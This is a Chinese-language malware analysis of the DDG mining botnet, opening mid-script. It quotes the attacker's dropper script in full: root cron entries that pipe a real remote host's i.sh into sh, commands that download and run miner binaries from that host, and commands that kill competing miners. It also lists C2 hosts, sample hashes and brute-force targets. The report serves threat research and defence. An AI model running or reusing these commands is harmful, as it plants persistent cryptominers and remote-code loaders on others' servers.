    fi  
    chmod +x /tmp/ddg.2011 && /tmp/ddg.2011
    #if [ ! -f "/tmp/ss2480.2" ]; then
        #curl -fsSL http://218.248.40.228:8443/ss2480.2 -o /tmp/ss2480.2
    #fi
    #chmod +x /tmp/ss2480.2 && /tmp/ss2480.2
    ps auxf | grep -v grep | grep ss2480.1 | awk '{print $2}' | kill  
    #ps auxf | grep -v grep | grep ss22522.1 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ss22522.2 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.1010 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.1021 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2001 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2003 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2004 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2005 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2011 || rm -rf /tmp/ddg.2011
由 i.sh
脚本内容可知，攻击者只需更新其中的样本下载地址，便可以灵活地向失陷主机投放任意恶意软件。根据我们的监控，该云端配置文件确实会不定时更新，用以投放新版木马文件，或者投放集成新的攻击方式的恶意软件。其投递的恶意软件包括：
  * **DDG 样本** ：即 ddg.$(uname -m) 系列样本，这是长期投递的攻击载荷，我们监测到 v2011、v2020 和 v2021 共 3 个大版本
  * **ss22522** 系列样本：短时间内投递过，针对Struts2 漏洞 S2-052
  * **ss2480** 系列：短时间内投递过，是针对 OrientDB 漏洞的攻击样本，正是这个样本在短时间内的大规模扫描暴露了自己
另外，早期版本中 kill 命令前面没有 xargs，进程并不会真正被杀死，在后期版本上这个 xargs 被加了进去，修复了这个问题。
2018.1.3 日，攻击者上线了最新的 i.sh(v2021.2)，新增了另外一个挖矿木马 **imWBR1** ，正是该木马中内置了前文列出的第二个
XMR 钱包地址 :
    export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
    echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/root  
    echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/root  
    mkdir -p /var/spool/cron/crontabs  
    echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/crontabs/root  
    echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/crontabs/root
    if [ ! -f "/tmp/ddg.2021" ]; then  
        curl -fsSL http://218.248.40.228:8443/2021/ddg.$(uname -m) -o /tmp/ddg.2021
    fi
    if [ ! -f "/tmp/ddg.2021" ]; then  
        wget -q http://218.248.40.228:8443/2021/ddg.$(uname -m) -O /tmp/ddg.2021
    fi
    chmod +x /tmp/ddg.2021 && /tmp/ddg.2021
    if [ ! -f "/tmp/imWBR1" ]; then  
        curl -fsSL http://218.248.40.228:8443/imWBR1 -o /tmp/imWBR1 --compressed
    fi
    ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill  
    #ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
### 第二阶段
ddg 样本中内置了一个 **hub_iplist.txt** 文件，其中包含了上百个 `hub_ip:8443` 的列表。经我们排查，这些 hub_ip
对应的主机，多是常规网站服务器，都被攻击者入侵而沦为攻击者的肉鸡。
在这个阶段，ddg 会依次尝试连接 hub_iplist.txt 里的 hub_ip，如果成功连接某个 hub_ip ，ddg 就会访问
`http://:8443/wnTKYg` 下载对应的 Miner 程序 wnTKYg 并启动（如果本机 CPU 不支持 **AES-NI** ，还会下载 **wnTKYg.noaes** ）。ddg 尝试连接 hub_ip 的过程抓包如下：
ddg.xxx 与 ss2480.xxx 样本均由 Golang 编写而成。ddg 与 hub_ip 通信，通过一个 Golang 第三方 Stream
Multiplexing 库 [Smux](https://github.com/xtaci/smux) 完成。ddg 用了 Smux 的默认配置：  
所以在 ddg 从 hub_ip 下载 Miner 并启动后的
[KeepAlive](https://github.com/xtaci/smux/blob/ebec7ef2574b42a7088cd7751176483e0a27d458/session.go#L284)
阶段，就会每隔 10s 向已连接的 hub_ip 发 2 个数据包：
## 样本中内置的 hub_iplist.txt
i.sh 文件中的 ddg 样本下载 URL 是 `hxxp://218.248.40.228:8443/2011/ddg.$(uname -m)`。ddg
文件V2011内置的 hub_iplist.txt 中有 158 个 hub_ip:8443 和 3 个 hub_domain:8443 列表，其中 2 个
Domain 未注册，然后被我们注册并 Sinkhole。
2017-11-10 我们发现 i.sh 文件内容有变化，ddg 样本最新的下载链接变成了
`hxxp://218.248.40.228:8443/2020/ddg.$(uname -m)` 。我们排查后发现是 ddg 内置的  
hub_iplist.txt 内容有变化，估计是之前我们 Sinkhole 了黑客未注册的域名被他们发觉，他们重新上线了一批 hub_ip，替换掉了全部的
hub_ip。
## DDG Mining Botnet 的攻击目标，还曾瞄准 Redis 数据库与 SSH 服务
以上分析中，DDG 的攻击目标集中在 OrientDB 上。
事实上，ddg 木马中的 `ddg.$(uname -m)` 系列样本还可以对 SSH 服务和 Redis 服务发起扫描&暴破攻击，这也是 ddg
一直以来入侵用户主机的主要手段。样本中内置的部分相关函数以及暴破字典如下两图所示：
样本中还有内置的 3 个 x509 证书 / 密钥文件如下：
  * slave.pem
  * ca.pem
  * slave.key
详细内容见文末 IoC 部分。
回溯历史数据时，我们还能看到 i.sh 的 host 218.248.40.228 在更早期扫描 Redis
数据库的痕迹。互联网上也偶尔会有受害者曝光自己服务器中了 ddg 木马被用来挖矿。 下表是 218.248.40.228 在 2017-09-27
20:00:00 ~ 2017-10-25 11:00:00 期间扫描端口的分布情况。
按照扫描次数排序，6379, 7379，2480, 三个端口分别 Redis, Redis(Replicas), OrientDB 数据库服务：
###
## 近况
北京时间 2018.1.25 日 21 点左右，`hxxp://218.248.40.228:8443/2011/ddg.x86_64` 的样本更新，MD5
为 **cbc4ba55c5ac0a12150f70585af396dc** ，是一个 Mirai 家族的样本。
Mirai C2 为 `linuxuclib.com:8080` 。
另外一个硬编码明文 C2 `jbeupq84v7.2y.net` 目前在在DNS系统中没有配置解析IP地址。
## IoC
C2:
    202.181.169.98:8443  
    218.248.40.228:8443  
    linuxuclib.com:8080  
    jbeupq84v7.2y.net  
样本 MD5:
    b1201bf62f3ca42c87515778f70fd789    ddg.i686   --> v2011  
    7705b32ac794839852844bb99d494797    ddg.x86_64 --> v2011  
    1970269321e3d30d6b130af390f2ea5c    ddg.i686   --> v2020  